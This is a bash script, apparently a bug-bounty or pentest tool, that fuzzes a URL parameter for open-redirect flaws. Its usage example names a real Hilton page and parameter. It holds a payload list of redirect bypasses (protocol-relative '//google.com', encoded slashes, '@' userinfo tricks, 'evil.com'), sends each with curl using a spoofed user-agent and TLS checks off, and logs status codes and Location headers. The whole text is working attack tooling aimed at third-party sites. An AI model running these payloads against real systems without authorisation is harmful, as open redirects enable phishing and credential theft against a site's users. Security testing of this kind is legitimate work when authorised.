#!/bin/bash
#############################################
# PROFESSIONAL REDIRECT PARAMETER FUZZER
#############################################

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <base_url> <parameter_name>"
    echo "Example:"
    echo "$0 https://home2suites.hilton.com/doxch.jhtml dst"
    exit 1
fi

BASE_URL="$1"
PARAM="$2"
OUTPUT="redirect_report.txt"

# Payload list
PAYLOADS=(
"https://google.com"
"http://google.com"
"//google.com"
"///google.com"
"https:%2f%2fgoogle.com"
"https:/google.com"
"/\\google.com"
"https://google.com@hilton.com"
"//google.com/%2e%2e"
"https://evil.com"
"//evil.com"
)

echo "===================================" > "$OUTPUT"
echo "Redirect Fuzzing Report" >> "$OUTPUT"
echo "Target: $BASE_URL" >> "$OUTPUT"
echo "Parameter: $PARAM" >> "$OUTPUT"
echo "===================================" >> "$OUTPUT"
echo "" >> "$OUTPUT"

printf "\n%-35s %-10s %-60s\n" "Payload" "Status" "Location"
printf "%-35s %-10s %-60s\n" "-------" "------" "--------"

for payload in "${PAYLOADS[@]}"; do

    # Handle existing parameters
    if [[ "$BASE_URL" == *"?"* ]]; then
        URL="${BASE_URL}&${PARAM}=${payload}"
    else
        URL="${BASE_URL}?${PARAM}=${payload}"
    fi

    RESPONSE=$(curl -k -s -I -A "Mozilla/5.0" "$URL")

    STATUS=$(echo "$RESPONSE" | grep -E "^HTTP" | tail -n1 | awk '{print $2}')
    LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | sed 's/[Ll]ocation: //')

    if [ -z "$STATUS" ]; then
        STATUS="NO_RESPONSE"
    fi

    printf "%-35s %-10s %-60s\n" "$payload" "$STATUS" "$LOCATION"

    {
        echo "Payload: $payload"
        echo "Status: $STATUS"
        echo "Location: $LOCATION"
        echo "-----------------------------------"
    } >> "$OUTPUT"

done

echo ""
echo "Scan complete. Report saved to $OUTPUT"
